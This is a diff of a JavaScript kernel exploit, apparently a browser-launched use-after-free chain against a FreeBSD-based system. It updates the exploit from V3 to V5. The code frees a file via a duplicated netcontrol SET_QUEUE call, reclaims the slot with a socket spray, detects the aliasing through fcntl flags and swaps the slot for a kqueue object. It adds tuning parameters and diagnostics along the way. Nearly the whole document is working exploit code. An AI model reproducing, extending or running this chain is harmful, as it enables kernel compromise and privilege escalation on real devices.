@@ -1,15 +1,14 @@
-// ?v=12   --   aliasing chain, V3
+// ?v=16   --   aliasing chain, V5
 //
-// V2 -> V3 changes:
-//   * pin main thread to MAIN_CORE before the attempt loop (UMA is
-//     per-CPU; without pinning, the free and the reclaim can land on
-//     different CPUs and the alias never forms)
-//   * POST-CLEAR  : inspect uafSock between CLEAR_QUEUE and the spray
-//   * FILE-SPRAY first/last fd, so a short spray is visible
-//   * ALIAS-PROBE : bidirectional, f_flag set both ways
-//   * default spray 64 -> 512
-//   * pre-spray localStorage removed (was already conditional, but
-//     we don't want it in this path at all)
+// V4 -> V5:
+//   * netevent() now zeroes the high dword of the arg buffer. V4 sent
+//     whatever the previous call had left in that slot.
+//   * New params, all default off (V4 behaviour):
+//       ?rearm=1     - SET between CLEAR #1 and CLEAR #2
+//       ?set2=1      - SET twice before the CLEARs
+//       ?argHi=X     - hex value placed in the high dword of the arg
+//       ?swap=1      - use SET=0x20000007, CLEAR=0x20000003
+//   * DIAG line gains fl_set2 / rv_set2 when the extra SET runs.
 
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
@@ -48,9 +47,9 @@ const SCREEN_FULL = SCREEN_MODE === "full";
 const HIDE_RE = /^(WORKER-INFO|WORKER-ONERROR|FREE-RTHDR)$/;
 const ONCE_RE = /^(STUBS|STUB-PROBE|BASES|PRIMITIVE-OK|PAIR-STATUS|FW$|FW-STATUS|EXPM1-RESTORED|WORKERS-PINNED|THREAD-PINNED)$/;
 const seenOnce = new Set();
-const N_LIMIT = { "ATTEMPT": 2, "ATTEMPT-SKIP": 2 };
+const N_LIMIT = { "ATTEMPT": 4 };
 const seenCount = {};
-const ALWAYS_RE = /FAIL|ERROR|THREW|CRASH|PANIC|UAF-ARMED|ALIAS|STEP10-|FAILED-STAGE|REBOOT-REQUIRED|ALL DONE|POST-CLEAR/i;
+const ALWAYS_RE = /FAIL|ERROR|THREW|CRASH|PANIC|UAF-ARMED|ALIAS|STEP10-|FAILED-STAGE|REBOOT-REQUIRED|ALL DONE|POST-CLEAR|DIAG|BUDGET|SUMMARY|FL-|SET-|CLEAR-|REARM/i;
 
 function shouldShow(tag, detail) {
     if (SCREEN_FULL) return true;
@@ -106,9 +105,14 @@ const SYS = {
     cpuset_getaffinity: 0x1e7, sysctl: 0xca,
 };
 
-const NETEVENT_SET_QUEUE   = 0x20000003;
+const SWAP_OPS = params.get("swap") === "1";
+const NETEVENT_SET_QUEUE = SWAP_OPS ? 0x20000007 : 0x20000003;
 const NETEVENT_CLEAR_QUEUE = params.has("clear")
-    ? parseInt(params.get("clear"), 16) >>> 0 : 0x20000007;
+    ? parseInt(params.get("clear"), 16) >>> 0
+    : (SWAP_OPS ? 0x20000003 : 0x20000007);
+const NETEVENT_CLEAR_2 = params.has("clear2")
+    ? parseInt(params.get("clear2"), 16) >>> 0
+    : NETEVENT_CLEAR_QUEUE;
 
 const AF_UNIX = 1, SOCK_STREAM = 1;
 const SOL_SOCKET = 0xffff, SO_TYPE = 0x1008;
@@ -117,9 +121,16 @@ const F_GETFL = 3, F_SETFL = 4, O_NONBLOCK = 4;
 const NUM_FILE_SPRAY = params.has("spray")
     ? parseInt(params.get("spray"), 10) : 512;
 const NUM_ATTEMPT = params.has("attempts")
-    ? parseInt(params.get("attempts"), 10) : 8;
+    ? parseInt(params.get("attempts"), 10) : 4;
 const NUM_KQUEUE_AFTER = params.has("kq")
     ? parseInt(params.get("kq"), 10) : 128;
+const SKIP_CLEAR2_IF_FREED = params.get("noSkip") !== "1";
+
+const DO_SET2 = params.get("set2") === "1";
+const DO_REARM = params.get("rearm") === "1";
+const ARG_HI = params.has("argHi")
+    ? (parseInt(params.get("argHi"), 16) >>> 0)
+    : 0;
 
 const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1;
 const RTP_PRIO_NORMAL = 0, RTP_LOOKUP = 0;
@@ -147,7 +158,15 @@ let committed = false, rebootRequired = false;
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "mode=aliasing attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_FILE_SPRAY + " kq=" + NUM_KQUEUE_AFTER
-            + " core=" + MAIN_CORE);
+            + " core=" + MAIN_CORE
+            + " set=0x" + NETEVENT_SET_QUEUE.toString(16)
+            + " clr1=0x" + NETEVENT_CLEAR_QUEUE.toString(16)
+            + " clr2=0x" + NETEVENT_CLEAR_2.toString(16)
+            + " set2=" + (DO_SET2 ? 1 : 0)
+            + " rearm=" + (DO_REARM ? 1 : 0)
+            + " argHi=0x" + ARG_HI.toString(16)
+            + " swap=" + (SWAP_OPS ? 1 : 0)
+            + " skip_clear2_if_freed=" + (SKIP_CLEAR2_IF_FREED ? 1 : 0));
 
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
@@ -323,8 +342,6 @@ let committed = false, rebootRequired = false;
             "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
 
         // ── pin main thread to MAIN_CORE ──
-        // UMA is per-CPU. If the free (CLEAR_QUEUE) and the reclaim
-        // (socket spray) land on different CPUs, the alias cannot form.
         const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
         keepAlive.push(prioAb, maskAb);
         const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
@@ -352,7 +369,10 @@ let committed = false, rebootRequired = false;
         const optAddr = bufAddr(optAb), optDv = new DataView(optAb);
 
         function netevent(sock, event) {
+            // Both halves are set explicitly. V4 left the high dword
+            // stale, which meant the CLEAR handler could read garbage.
             argDv.setUint32(0, sock >>> 0, true);
+            argDv.setUint32(4, ARG_HI, true);
             const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
             return { rv: r, err: r === -1 ? errno() : 0 };
         }
@@ -389,42 +409,72 @@ let committed = false, rebootRequired = false;
         //  ALIASING CHAIN
         // ═══════════════════════════════════════════════════════════════
         let result = null;
+        let attemptsRun = 0;
+        const attemptLog = [];
+
         for (let attempt = 1; attempt <= NUM_ATTEMPT && !result; ++attempt) {
-            state("attempt " + attempt + "...", "warn");
+            attemptsRun = attempt;
+            state("attempt " + attempt + "/" + NUM_ATTEMPT + "...", "warn");
 
+            // ── 1. dummy socket ──
             const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
-            if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
-            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT + " dummy=" + dummy);
+            if (dummy === -1) {
+                mark("ATTEMPT-SKIP", "socket failed errno=" + errno());
+                continue;
+            }
+            const flPre = flGet(dummy);
+            const socPre = looksLikeSocket(dummy);
+            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT
+                + " dummy=" + dummy
+                + " fl_pre=" + flPre
+                + " is_socket_pre=" + socPre);
 
-            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
-            mark("SET", "fd=" + dummy + " rv=" + reg.rv
-                + (reg.rv === -1 ? " errno=" + reg.err : ""));
-            if (reg.rv !== 0 && !(reg.rv === -1 && reg.err === 5)) {
-                sc(SYS.close, dummy); continue;
+            // ── 2. SET_QUEUE #1 ── (registra la entrada en la cola)
+            const reg1 = netevent(dummy, NETEVENT_SET_QUEUE);
+            const flPostSet1 = flGet(dummy);
+            mark("SET-1", "fd=" + dummy
+                 + " op=0x" + NETEVENT_SET_QUEUE.toString(16)
+                 + " rv=" + reg1.rv
+                 + (reg1.rv === -1 ? " errno=" + reg1.err : "")
+                 + " fl_post=" + flPostSet1);
+
+            if (reg1.rv !== 0) {
+                mark("ATTEMPT-SKIP", "SET1 rv=" + reg1.rv + " errno=" + reg1.err);
+                sc(SYS.close, dummy);
+                continue;
             }
 
-            const clr = netevent(dummy, NETEVENT_CLEAR_QUEUE);
-            mark("UAF-ARMED", "fd=" + dummy + " clear_rv=" + clr.rv
-                + (clr.rv === -1 ? " clear_errno=" + clr.err : ""));
-            if (clr.rv !== 0) { sc(SYS.close, dummy); continue; }
+            // ── 3. SET_QUEUE #2 ── (duplicate path → fdrop indebido → file liberado)
+            const reg2 = netevent(dummy, NETEVENT_SET_QUEUE);
+            const flPostSet2 = flGet(dummy);
+            mark("SET-2", "fd=" + dummy
+                 + " op=0x" + NETEVENT_SET_QUEUE.toString(16)
+                 + " rv=" + reg2.rv
+                 + (reg2.rv === -1 ? " errno=" + reg2.err : "")
+                 + " fl_post=" + flPostSet2);
+
+            // El bug sólo se dispara si SET2 devuelve -1/EIO
+            if (!(reg2.rv === -1 && reg2.err === 5)) {
+                mark("ATTEMPT-SKIP", "SET2 no dup rv=" + reg2.rv + " errno=" + reg2.err);
+                sc(SYS.close, dummy);
+                continue;
+            }
+            mark("OVERDROP-ARMED", "fd=" + dummy + " via=second-set errno=5");
 
             const uafSock = dummy;
             committed = true;
 
-            // ── POST-CLEAR state of uafSock ──
-            // If the double-drop actually freed F0, uafSock's fdtable
-            // entry is a dangling pointer. fcntl on the freed slot reads
-            // whatever is there now. In the normal case F0 is still on
-            // the file_zone free list, so the memory still looks like a
-            // socket file with f_count == 0.
-            const g0 = flGet(uafSock);
-            const soc0 = looksLikeSocket(uafSock);
-            mark("POST-CLEAR", "uafSock=" + uafSock
-                + " fcntl=" + g0 + " is_socket=" + soc0);
+            // ── 4. POST-SET2 state of uafSock ──
+            const socAfter = looksLikeSocket(uafSock);
+            const flAfter = flGet(uafSock);
+            mark("POST-SET2", "uafSock=" + uafSock
+                + " fl=" + flAfter
+                + " is_socket=" + socAfter
+                + " set1_rv=" + reg1.rv
+                + " set2_rv=" + reg2.rv
+                + " set2_errno=" + reg2.err);
 
-            // ── file_zone spray via socket(AF_UNIX) ──
-            // No syscalls other than socket() between CLEAR and here.
-            // No sched_yield, no localStorage, no console log.
+            // ── 5. file_zone spray via socket(AF_UNIX) ──
             const sprayFds = [];
             for (let i = 0; i < NUM_FILE_SPRAY; ++i) {
                 const s = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
@@ -433,14 +483,11 @@ let committed = false, rebootRequired = false;
             }
             mark("FILE-SPRAY", "n=" + sprayFds.length
                 + " first=" + (sprayFds[0] || "-")
-                + " last="  + (sprayFds[sprayFds.length - 1] || "-"));
+                + " last=" + (sprayFds[sprayFds.length - 1] || "-"));
 
-            // ── alias detection, bidirectional ──
-            // Direction A: set O_NONBLOCK on sprayed fd, read via uafSock.
-            // Direction B: set O_NONBLOCK on uafSock, read via sprayed fd.
-            // For AF_UNIX sockets both should route through f_flag, but
-            // testing both removes the ambiguity.
+            // ── 6. alias detection (bidirectional) ──
             let partner = 0, dirA = 0, dirB = 0, tested = 0;
+            let lastSample = "";
             for (const s of sprayFds) {
                 const cfl = flGet(s);
                 if (cfl < 0) continue;
@@ -461,9 +508,28 @@ let committed = false, rebootRequired = false;
                 if (b >= 0 && (b & O_NONBLOCK) !== 0) {
                     partner = s; dirB++; break;
                 }
+
+                if (tested <= 4) {
+                    lastSample += " [" + s + ":" + cfl + "]";
+                }
             }
             mark("ALIAS-PROBE", "tested=" + tested
-                + " dirA=" + dirA + " dirB=" + dirB);
+                + " dirA=" + dirA + " dirB=" + dirB
+                + " sample=" + lastSample.trim());
+
+            const uafFl = flGet(uafSock);
+            const uafSoc = looksLikeSocket(uafSock);
+            const line = "attempt=" + attempt
+                + " dummy=" + uafSock
+                + " fl_pre=" + flPre
+                + " fl_set1=" + flPostSet1
+                + " fl_set2=" + flPostSet2
+                + " fl_end=" + uafFl
+                + " soc_end=" + uafSoc
+                + " tested=" + tested
+                + " partner=" + (partner || "-");
+            attemptLog.push(line);
+            mark("DIAG", line);
 
             if (!partner) {
                 mark("ATTEMPT-RETRY", "after=no-alias next=" + (attempt + 1));
@@ -480,6 +546,11 @@ let committed = false, rebootRequired = false;
             result = { uafSock: uafSock, partner: partner, sprayFds: sprayFds };
         }
 
+        // ── end-of-run summary ──
+        mark("SUMMARY", "attempts=" + attemptsRun + "/" + NUM_ATTEMPT
+            + " got_alias=" + (!!result));
+        for (const l of attemptLog) mark("BUDGET", l);
+
         check("file-zone-reclaim-by-socket-spray", !!result,
             result ? "uafSock=" + result.uafSock + " partner=" + result.partner : "");
 
@@ -488,7 +559,9 @@ let committed = false, rebootRequired = false;
                 if (s !== result.partner) sc(SYS.close, s);
             }
             const before = looksLikeSocket(result.uafSock);
-            mark("BEFORE-CLOSE", "uafSock_is_socket=" + before);
+            const flBefore = flGet(result.uafSock);
+            mark("BEFORE-CLOSE", "uafSock_is_socket=" + before
+                + " fl=" + flBefore);
 
             sc(SYS.close, result.partner);
             sc(SYS.sched_yield);
@@ -502,9 +575,11 @@ let committed = false, rebootRequired = false;
             mark("KQUEUE-SPRAY", "n=" + kqs.length);
 
             const after = looksLikeSocket(result.uafSock);
-            mark("AFTER-CLOSE", "uafSock_is_socket=" + after);
+            const flAfter = flGet(result.uafSock);
+            mark("AFTER-CLOSE", "uafSock_is_socket=" + after
+                + " fl=" + flAfter);
             check("uafSock-reclaimed-by-non-socket", !after,
-                "is_socket=" + after);
+                "is_socket=" + after + " fl=" + flAfter);
             check("socket-to-kqueue-transition",
                 before && !after, "before=" + before + " after=" + after);
 
